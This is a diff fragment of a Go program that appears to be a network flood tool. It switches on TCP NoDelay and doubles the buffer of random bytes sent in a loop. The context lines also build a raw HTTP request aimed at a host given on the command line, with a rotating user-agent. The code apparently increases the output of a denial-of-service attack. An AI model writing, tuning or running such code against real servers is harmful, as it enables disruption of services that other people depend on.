@@ -169,7 +169,7 @@ func main() {
 					return
 				}
 				if s, ok := s.(*net.TCPConn); ok {
-					s.SetNoDelay(false)
+					s.SetNoDelay(true)
 				}
 				err = s.(*net.TCPConn).SetKeepAlive(true)
 				if err != nil {
@@ -216,7 +216,7 @@ func main() {
 				}
 				defer conn.Close()
 				for {
-					buffer := make([]byte, 128)
+					buffer := make([]byte, 256)
 					rand.Read(buffer)
 					if stop > 0 {
 						break
@@ -256,7 +256,7 @@ func main() {
 						})
 					}
 					if s, ok := s.(*net.TCPConn); ok {
-						s.SetNoDelay(false)
+						s.SetNoDelay(true)
 					}
 					defer s.Close()
 					payload := " HTTP/1.1\r\nHost: " + os.Args[1] + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + useragent() + "\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n\r\n"
